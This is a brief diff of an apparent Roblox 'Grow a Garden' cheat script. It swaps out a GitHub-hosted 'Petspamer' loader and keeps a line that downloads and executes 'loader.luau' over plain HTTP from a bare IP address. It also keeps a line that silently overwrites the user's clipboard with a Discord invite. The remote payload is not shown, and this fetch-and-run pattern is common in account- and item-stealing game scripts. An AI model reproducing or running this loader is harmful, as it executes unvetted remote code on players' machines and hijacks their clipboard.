@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/Petspamer.lua"))()
 setclipboard("https://discord.gg/HcxFCR3ZTQ")
 ID="abcceb11-4d2e-4607-9127-1099260a3e50";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
